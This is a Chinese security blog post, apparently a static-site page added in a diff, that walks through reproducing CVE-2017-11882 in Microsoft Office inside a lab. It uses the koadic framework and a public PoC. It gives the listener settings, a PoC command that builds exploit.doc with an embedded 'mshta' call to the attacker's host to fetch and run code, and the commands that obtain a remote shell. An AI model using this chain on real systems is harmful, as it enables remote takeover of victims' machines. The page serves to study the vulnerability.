@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>CVE-2017-11882漏洞复现和利用 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">CVE-2017-11882漏洞复现和利用</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p>影响版本<br>
+Microsoft Office 2007 Service Pack 3<br>
+Microsoft Office 2010 Service Pack 2<br>
+Microsoft Office 2013 Service Pack 1<br>
+Microsoft Office 2016</p>
+<!-- more -->
+<p>实验环境<br>
+office2016<br>
+Win7<br>
+kali<br>
+实验步骤<br>
+用msf一直复现不成功。。。。<br>
+这里通过koadic漏洞复现<br>
+下载koadic和poc</p>
+<pre><code>https://github.com/guokeya/tools/koadic-master.zip
+https://github.com/guokeya/tools/CVE-2017-11882.zip
+</code></pre>
+<p>将koadic和Poc都拖入kali<br>
+./koadic运行<br>
+<img src="https://guokeya.github.io/post-images/1577950075122.png" alt="" loading="lazy"></p>
+<pre><code>Set lhost 192.168.47.140
+Set lport 1234
+Run
+</code></pre>
+<p>这里返回了一个URL：http://192.168.47.140:1234/ZxMtV<br>
+下面就要用poc生成一个包含以上URL恶意代码的doc文件</p>
+<pre><code>python Command109b_CVE-2017-11882.py -c “mshta http://192.168.47.140:1234/ZxMtV” -o exploit.doc
+</code></pre>
+<p>拖入win7，运行下,成功返回shell</p>
+<p>在koadic执行zombies 0 切换到项目<br>
+cmdshell 0 获取shell<br>
+<img src="https://guokeya.github.io/post-images/1577950097418.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/漏洞复现/" class="tag">
+                    漏洞复现
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/Z1OZVMVt4/">
+                  <h3 class="post-title">
+                    Centos 6.5安装完LNMP后的加固
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
